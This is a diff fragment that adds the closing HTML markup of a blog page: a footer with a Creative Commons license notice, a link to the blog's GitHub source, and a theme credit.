+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
